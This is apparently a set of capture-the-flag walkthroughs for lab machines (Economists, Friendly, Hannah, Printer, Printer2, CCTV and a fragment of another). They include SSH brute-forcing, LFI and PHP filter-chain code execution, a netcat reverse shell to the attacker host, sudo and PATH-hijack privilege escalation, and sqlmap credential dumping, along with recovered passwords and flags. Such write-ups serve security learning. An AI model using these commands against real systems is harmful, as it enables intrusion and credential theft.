/n3gr4/
Browsing the directory showed an empty page.
Running Gobuster again against this directory with the manually generated wordlist finally discovered an interesting PHP file.
m414nj3.phpThe page returned HTTP status code 500, indicating that it was likely expecting user input.
Local File Inclusion (LFI)# The first assumption was that the page could be vulnerable to Local File Inclusion.
To identify the parameter name, I fuzzed common parameter names.
ffuf \ -w /opt/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \ -u 'http://10.10.10.27/n3gr4/m414nj3.php?FUZZ=/etc/passwd' \ -fs 0The parameter was identified as:
page
Using the parameter successfully disclosed /etc/passwd, confirming the LFI vulnerability.
Among the system users, one account stood out:
p4l4nc4
Reading Sensitive Files# After confirming the LFI, I continued reading sensitive files.
Files attempted:
/etc/passwdThe LFI exposed the local user p4l4nc4, which became the target for the next stage of the attack.
Initial Access# Since SSH was available, I attempted to brute-force the discovered user with a small RockYou-based wordlist.
hydra -l p4l4nc4 -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.27The password was recovered successfully.
Username: p4l4nc4 Password: friendster
Logging in through SSH succeeded.
Privilege Escalation# p4l4nc4 → root# The first step was checking sudo permissions.
sudo -lThe user had no sudo privileges.
Next, I enumerated the user’s home directory.
ls -laI found a .bash_history file.
Reviewing the command history revealed that /etc/passwd had previously been made world writable.
chmod 666 /etc/passwd
Checking the file permissions confirmed that the file was still writable by any user.
Since /etc/passwd was writable, I generated a password hash and created a new root-level user.
mkpasswd voidThen I appended the new user to /etc/passwd.
void:<password_hash>:0:0:root:/root:/bin/bash
After switching to the newly created account, I obtained a root shell.
Credentials# p4l4nc4:friendster Flags# user:HMV{6cfb952777b95ded50a5be3a4ee9417af7e6dcd1} root:HMV{4c3b9d0468240fbd4a9148c8559600fe2f9ad727}

title: Economists - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.26 The objective was to enumerate the target, identify exposed services, gain initial access by brute-forcing SSH credentials obtained during enumeration, and escalate privileges by abusing a misconfigured sudo rule allowing execution of systemctl.
Port Scanning# RustScan# rustscan -a 10.10.10.26 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rw-rw-r-- Brochure-1.pdf | -rw-rw-r-- Brochure-2.pdf | -rw-rw-r-- Financial-infographics-poster.pdf | -rw-rw-r-- Gameboard-poster.pdf | -rw-rw-r-- Growth-timeline.pdf | -rw-rw-r-- Population-poster.pdf 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 80/tcp open http Apache httpd 2.4.41The target exposed three services:
FTP (anonymous access enabled) SSH Apache HTTP server Anonymous FTP immediately stood out as the most promising attack surface.
Enumeration# FTP# Nmap revealed that anonymous authentication was enabled on the FTP service.
After logging in as anonymous, I downloaded all available PDF files.
anonymousmget ./*
Since the files looked like company documents, I inspected their metadata.
exiftool * | grep -i autho | cut -d ":" -f2 | uniq > ../../creds/usersThe metadata revealed several author names which were likely employee usernames.
Because SSH was available, these usernames would later become useful for password attacks.
Web Enumeration# Browsing the website did not immediately reveal anything interesting.
One useful piece of information was the company email address:
info@elite-economists.hmvThis suggested the virtual host:
elite-economists.hmvAfter adding it to /etc/hosts, I continued enumerating the website.
Neither directory brute forcing nor Nikto revealed anything useful, so I shifted my focus back to SSH.
SSH Password Attack# Using the usernames recovered from the PDF metadata, I attempted password brute forcing.
RockYou did not produce any valid credentials, so I generated a custom wordlist using CeWL and used Medusa against SSH.
medusa -M ssh \ -h 10.10.10.26 \ -U creds/users \ -P misc/cewl_passwdA valid credential pair was recovered:
joesph : wealthiest
Initial Access# Using the recovered credentials, I successfully logged in through SSH.
Username: joesph Password: wealthiest
Privilege Escalation# joesph → root# The first step after obtaining a shell was checking the user’s sudo permissions.
sudo -lThe output showed that joesph could execute:
/usr/bin/systemctl statusas any user, including root, without providing a password.
The systemctl status command displays its output through the less pager by default.
This is important because less allows spawning an interactive shell using:
!/bin/bashI started the allowed command:
sudo -u root /usr/bin/systemctl statusOnce inside the pager, I executed:
!/bin/bashThis immediately spawned a root shell.
Verifying the current user confirmed successful privilege escalation to root
Credentials# joesph:wealthiest Flags# user:HMV{37q3p33CsMJgJQbrbYZMUFfTu} root:HMV{NwER6XWyM8p5VpeFEkkcGYyeJ}

title: Friendly - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.25 The objective was to enumerate the target, identify exposed services, gain initial access through an anonymous FTP file upload, and escalate privileges by abusing a misconfigured sudo rule that allowed execution of Vim as root.
Port Scanning# RustScan# rustscan -a 10.10.10.25 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ProFTPD | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 root root 10725 Feb 23 2023 index.html 80/tcp open http syn-ack Apache httpd 2.4.54 ((Debian)) |_http-server-header: Apache/2.4.54 (Debian) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: Apache2 Debian Default Page: It worksOnly two services were exposed: FTP on port 21 and Apache HTTP on port 80. Since anonymous FTP access was enabled, it became the primary focus of enumeration.
Enumeration# Apache HTTP# Browsing to the web server displayed the default Apache page, indicating that no custom application was being served.
FTP Enumeration# The Nmap scan revealed that anonymous FTP login was allowed and that an index.html file was available.
After logging into the FTP server using the anonymous account, I downloaded the file.
To verify whether this file was the same one being served by Apache, I also downloaded the webpage directly.
Comparing both files confirmed they were identical.
diff index.html index.html.1
This confirmed that the FTP directory mapped directly to the web root, meaning uploaded files would be accessible through the web server.
Anonymous FTP File Upload# Since anonymous users had write permissions, I uploaded the PentestMonkey PHP reverse shell to the FTP server.
After testing, I removed unnecessary files to keep the FTP directory clean.
To delete uploaded files through FTP:
mdelete <filename>
Accessing the uploaded shell through the web server successfully triggered a reverse shell as the www-data user.
Initial Access# The initial foothold was obtained by uploading a PHP reverse shell through the anonymous FTP service and executing it via Apache.
The shell was received as:
www-data Privilege Escalation# www-data → root# The first step was checking sudo permissions.
sudo -l
The www-data user was allowed to execute:
/usr/bin/vimas any user, including root, without supplying a password.
This is a dangerous sudo misconfiguration because Vim allows execution of arbitrary shell commands.
Using Vim, a root shell was obtained with:
sudo -u root /usr/bin/vim -c ':!/bin/bash'
Locating the Root Flag# Attempting to read /root/root.txt produced the following message:
Not yet! Find root.txt.
Searching the filesystem located the actual flag.
find / -type f -name root.txt 2>/dev/null
Credentials# No credentials were required. Flags# user:b8cff8c9008e1c98a1f2937b4475acd6 root:66b5c58f3e83aff307441714d3e28d2f

title: Hannah - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.24 The objective was to enumerate the target, identify exposed services, gain initial access through SSH credential brute forcing, and escalate privileges by abusing an insecure PATH configuration in a root cron job.
Port Scanning# RustScan# rustscan -a 10.10.10.24 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 80/tcp open http nginx 1.18.0 113/tcp open identOnly three ports were exposed:
22 - SSH 80 - HTTP (nginx) 113 - Ident SSH immediately became an interesting target because Nmap revealed the username moksha as the owner of the HTTP service.
Enumeration# HTTP# Browsing to the web server only displayed a simple “Under construction” page.
There was nothing useful in the page source.
robots.txt# Checking robots.txt revealed an interesting entry.
/enlightenment
Unfortunately, visiting the directory only resulted in a 404 Not Found page.
Since nothing useful was available through the website, I continued with further enumeration.
Directory Enumeration# Directory brute forcing did not reveal any additional content.
Because Nmap had already disclosed the username moksha, I decided to attempt password brute forcing against SSH instead.
Initial Access# SSH Brute Force# Using Hydra:
hydra -l moksha -P /opt/wordlists/rockyou-75.txt ssh://10.10.10.24Hydra successfully recovered the credentials:
Username: moksha Password: hannah
Using the recovered credentials, SSH authentication succeeded.
Privilege Escalation# Enumeration# The first thing I checked was whether sudo was installed.
sudo -lHowever, sudo was not installed.
I also checked whether the system used doas instead.
Unfortunately, it was not available either.
I continued searching for common privilege escalation vectors.
/opt# Nothing interesting was found.
Web Directory# The web directory also contained nothing useful.
User Cron Jobs# The moksha user had no cron jobs configured.
Root Cron Job# Checking root’s cron jobs revealed something much more interesting.
Root periodically executed:
touch /tmp/enlIghtenment
While inspecting the environment, I noticed that /media was included in the system PATH.
Even more importantly, /media was world writable, allowing any user to create executable files there.
This opened the door for a classic PATH hijacking attack.
PATH Hijacking# I created a malicious executable named touch inside /media.
#!/usr/bin/env bash cp /bin/bash /tmp/shell chmod u+s /tmp/shellAfter creating the file, I made it executable.
chmod 777 /media/touch The 777 permissions are excessive but acceptable for this CTF demonstration.
To monitor the attack, I watched the /tmp directory.
watch ls -la /tmp/Eventually, the root cron job executed my malicious touch binary instead of the legitimate system binary.
A SUID bash shell was created.
Running:
/tmp/shell -pprovided a root shell.
Credentials# moksha:hannah Flags# user:HMVGGHFWP2023 root:HMVHAPPYNY2023

title: Printer2 - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.23 The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion (LFI) vulnerability combined with a PHP filter chain, and escalate privileges by abusing a backdoored CUPS filter together with an insecure sudo configuration.
Enumeration# Port Scanning# RustScan# rustscan -a 10.10.10.23 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 80/tcp open http Apache httpd 2.4.56 ((Debian)) 631/tcp open ipp CUPS 2.3Only three services were exposed:
SSH Apache HTTP CUPS (IPP) Since SSH required valid credentials, web enumeration was the obvious starting point.
Web Enumeration# Browsing to the website revealed a simple hardware store homepage.
While inspecting the page source, I discovered a hostname that appeared to be intended as a virtual host.
Adding the hostname to /etc/hosts:
10.10.10.23 printer4life.printer.hmv
After visiting the new host, a different page was displayed containing the message:
I love printers so much! I print every minute.
along with several printer-related links.
Local File Inclusion# The application accepted a page parameter, making it a good candidate for Local File Inclusion testing.
The vulnerability was confirmed immediately:
curl -s 'http://printer4life.printer.hmv/index.php?page=/etc/passwd' | tail -n 33 | bat -l html
Reading /etc/passwd revealed two interesting users:
mabelle kierra PHP Filter Chain Remote Code Execution# After confirming the Local File Inclusion vulnerability, I first tested whether PHP stream wrappers were enabled by using the php://filter wrapper to read and encode the contents of index.php.
curl 'http://printer4life.printer.hmv/index.php?page=php://filter/convert.base64-encode/resource=index.php'The request was successful, confirming that PHP filters could be used through the vulnerable page parameter.
With the ability to include PHP streams, I attempted to escalate the LFI into Remote Code Execution using a PHP filter chain.
Reference:
https://github.com/synacktiv/php_filter_chain_generator The payload was generated using the following command:
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]` ?>'The generated filter chain was then supplied through the page parameter, allowing PHP code execution.
To obtain a reverse shell, I used:
curl -s "http://printer4life.printer.hmv/index.php?page=<generated_payload>&0=nc+-e+/bin/bash+10.10.10.2+9001"The command executed successfully, resulting in a reverse shell as www-data.
Privilege Escalation# www-data → mabelle# After gaining command execution as www-data, I started enumerating the filesystem looking for credentials or sensitive information.
The default web root (/var/www/html) did not contain anything useful. However, the virtual host directory contained credentials belonging to mabelle.
Using the recovered password, I switched to the mabelle user.
su - mabelleAfter enumerating Mabelle’s home directory, I found an SSH private key, allowing me to establish a stable SSH session.
Recovered credentials:
Username: mabelle Password: LIrmxk8EYtDSSH authentication was successful.
mabelle → kierra# The first thing I checked was sudo permissions.
sudo -lMabelle had no sudo privileges.
Checking locally listening ports revealed an unusual service on port 1001.
ss -lntp
Connecting to it with Netcat displayed a message mentioning that a backdoor had been added to a printer filter.
Searching the filesystem revealed a CUPS source tree inside /opt.
To identify the modifications, I archived the source code:
tar cvf /tmp/cups.tar cups-2.3.3/I then downloaded the official CUPS 2.3.3 source code from GitHub and compared the two directories.
diff -ruN origin/filter/ back/filter/ | less -RThe comparison revealed a backdoored printer filter.
Interacting with the service on port 1001 produced another password.
The credentials did not work for root, but they successfully authenticated as kierra.
Username: kierra Password: wK4EyQ15Cga
kierra → root# The first thing I checked after switching users was sudo permissions.
sudo -lThe user could execute the following binary without supplying a password:
/usr/lib/cups/filter/rastertopwg
This binary matched the backdoored filter discovered during the source code comparison.
Executing the binary with the hidden backdoor parameter through sudo resulted in a root shell.
Credentials# mabelle:LIrmxk8EYtD kierra:wK4EyQ15Cga Flags# user:63e2f2ec7e3dbae87afc4e0e86d0867b root:052cf26a6e7e33790391c0d869e2e40c

title: Printer - Walkthrough
content:
Overview# Attacker IP: 10.10.10.2 Target Machine IP: 10.10.10.22 The objective was to enumerate the target, identify exposed services, gain initial access through an exposed NFS share, and escalate privileges by abusing an insecure log archiving script.
Enumeration# Port Scanning# RustScan# rustscan -a 10.10.10.22 -- -sC -sV -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 111/tcp open rpcbind 2049/tcp open nfs_acl 38975/tcp open nlockmgr 39487/tcp open mountd 48189/tcp open mountd 52073/tcp open mountdThe scan showed SSH was available on port 22 and an exposed NFS service on 2049, making NFS the most interesting attack surface.
Network File System (NFS)# I first checked whether any NFS exports were available.
sudo showmount -e 10.10.10.22The output showed that Lisa’s home directory was exported.
I created a local mount point and mounted the share.
sudo mkdir /mnt/printer sudo mount -t nfs 10.10.10.22:/home/lisa /mnt/printerAlthough the share was mounted successfully, I couldn’t modify any files because my local UID didn’t match Lisa’s.
The owner UID was 1098.
To match the UID, I created a local user.
sudo useradd -u 1098 lisa
After switching to that user, I gained write access to the mounted home directory.
SSH Access# Since SSH was available, I added my public key to Lisa’s authorized_keys.
cat ~/.ssh/id_rsa.pub > /mnt/printer/.ssh/authorized_keysI also ensured the permissions were restrictive enough for OpenSSH.
chmod 600 /mnt/printer/.ssh/authorized_keysSSH login as lisa was then successful.
Initial Access# SSH access was obtained as the lisa user by abusing the writable NFS export.
Privilege Escalation# lisa → root# The first thing I checked was sudo permissions.
sudo -lUnfortunately, sudo requested Lisa’s password, which I didn’t have.
I continued with manual enumeration.
Checking the system revealed only the root and lisa users.
While inspecting /opt, I found a directory named logs.
Inside it was a script named nsecure.
Reviewing the script showed that it watched /var/log/syslog for the string:
fatal error !Whenever that string appeared, it archived every log file from /opt and /var/log into journal.zip.
Because I couldn’t write directly to /var/log/syslog, I used the logger command, which writes to syslog without requiring elevated privileges.
I also noticed that every user had write permission on /opt.
I created a symbolic link pointing to the root SSH private key.
ln -s /root/.ssh/id_rsa /opt/root_logThen triggered the backup script.
logger "fatal error !"After waiting a few moments, the archive was generated.
After copying journal.zip to my machine, I discovered it was password protected.
After copying journal.zip to my machine, it required a password. Rather than brute-forcing it immediately, I continued enumerating the machine in hopes of finding the password
Printer Files# While reviewing the nsecure script, I noticed it referenced the /var/spool/cups directory. I checked its contents and found three unfamiliar files.
Listing the directory showed the following files.
Using the file command revealed they were HP Printer Language (PCL) documents.
After converting the PCL files to PDF, I inspected their contents.
The first document was simply a shopping list.
The second document contained a message for Lisa that included the password:
1154p455!1
The password successfully unlocked the ZIP archive.
Inside was the root SSH private key.
Logging in with the recovered key provided a root shell.
Cleanup# Remove the temporary user created to match Lisa’s UID.
sudo userdel -r lisa Credentials# lisa:1154p455!1 Flags# user: f590b7e83e4c8cd11d06849f9c1a8f6d root: ba72c777ca3351ac5a837e0cd8efa0ed

title: CCTV - Walkthrough
content:
Overview# Attacker IP: 10.10.14.24 Target Machine IP: 10.129.50.93 The objective was to enumerate the target, identify exposed services, gain initial access through a SQL injection vulnerability in ZoneMinder, and escalate privileges by exploiting a vulnerable MotionEye instance.
Port Scanning# RustScan# rustscan -a 10.129.50.93 -- -A -oA nmap/rustResults# PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.58 |_http-title: Did not follow redirect to http://cctv.htb/Only a few services were exposed externally, making web enumeration the next logical step.
Enumeration# HTTP# Browsing the target redirected all requests to cctv.htb, so I added the hostname to /etc/hosts.
The website appeared to belong to a security company.
While browsing, I found a Staff Login button that redirected to:
http://cctv.htb/zm/
The login portal was powered by ZoneMinder, an open-source video surveillance platform.
ZoneMinder SQL Injection# The login page did not disclose the application version, so I first tried the default credentials:
admin:adminThey worked, allowing access to the dashboard.
Once authenticated, I confirmed the installed version.
ZoneMinder v1.37.63
Searching for vulnerabilities affecting this version revealed a Boolean-based SQL Injection vulnerability.
Reference
https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3 The advisory included a proof of concept.
Testing the vulnerable endpoint confirmed the issue.
curl --cookie "ZMSESSID=<session>" \ "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1"
Dumping Credentials# The advisory also provided a ready-to-use sqlmap command.
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1"Enumeration was extremely slow, so I manually enumerated the database before dumping the user credentials.
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \ --batch \ --risk=3 \ --level=5 \ --cookie="ZMSESSID=<session>" \ --dbms=MySQL \ -D zm \ -T Users \ -C Id,Username,Password \ --dumpThe password hashes were successfully extracted.
I cracked them with John the Ripper.
john --wordlist=~/wordlists/rockyou.txt creds/hashesOne of the hashes produced valid SSH credentials.
mark:opensesame Initial Access# SSH was the only exposed remote login service, so I authenticated with the recovered credentials.
Username: mark Password: opensesameThe login was successful.
Privilege Escalation# mark → sa_mark# The first thing I checked was the user’s sudo privileges.
sudo -lNo sudo permissions were available.
I also checked Mark’s home directory but found nothing useful. While enumerating other users, I noticed the sa_mark home directory, although I didn’t have permission to access it.
Internal Services# Continuing manual enumeration, I found two interesting directories.
/opt/containerd /opt/videoI couldn’t access containerd, but /opt/video/backups contained a server.log file that didn’t reveal anything useful.
Next, I checked for listening services.
Besides SSH and MySQL, two internal ports stood out.
8765 8554Port 8765 responded to HTTP requests, so I forwarded it over SSH.
ssh -f -N -L 8765:127.0.0.1:8765 mark@cctv.htbBrowsing to http://127.0.0.1:8765 revealed a MotionEye instance.
MotionEye Enumeration# Mark’s credentials did not work on MotionEye.
After some research, I found that MotionEye stores its configuration in:
/etc/motioneyeInside the configuration, I recovered the administrator credentials.
Logging in with the recovered credentials was successful.
Inspecting the page source revealed the installed version.
0.43.1b4
Searching for public exploits returned an entry in Searchsploit.
The Searchsploit entry was only a text advisory, and the Metasploit module was unsuccessful.
Further research led to a working GitHub proof of concept.
https://github.com/gunzf0x/CVE-2025-60787/ Running the exploit resulted in a root shell.
Post Exploitation# After obtaining root access, I revisited the sa_mark home directory.
It contained a document named:
SecureVision Staff Announcement.pdfThe document simply announced the company’s migration to ZoneMinder and contained no additional credentials or sensitive information.
Credentials# SSH mark:opensesame MotionEye Username: admin Password: 989c5a8ee87a0e9521ec81a79187d162109282f0 Flags# user:1ec7dbd764842955dbc82eb589f5195b root:c6972ae0eed4ce229535139e6c8f9aa9
